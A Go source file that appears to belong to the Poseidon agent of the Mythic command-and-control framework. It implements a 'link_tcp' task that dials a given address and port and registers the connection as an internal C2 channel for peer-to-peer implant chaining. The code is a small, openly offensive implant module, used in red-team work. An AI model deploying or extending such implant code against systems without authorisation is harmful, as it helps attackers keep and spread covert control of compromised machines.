package link_tcp

import (
	// Standard

	"encoding/json"
	"fmt"
	"net"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Port    int    `json:"port"`
	Address string `json:"address"`
}

// Run - package function to run link_tcp
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := &Arguments{}
	err := json.Unmarshal([]byte(task.Params), args)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}
	connectionString := fmt.Sprintf("%s:%d", args.Address, args.Port)
	conn, err := net.Dial("tcp", connectionString)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}
	task.Job.AddInternalConnectionChannel <- structs.AddInternalConnectionMessage{
		C2ProfileName: "poseidon_tcp",
		Connection:    &conn,
	}
	msg.UserOutput = "Successfully Connected"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg

	return
}
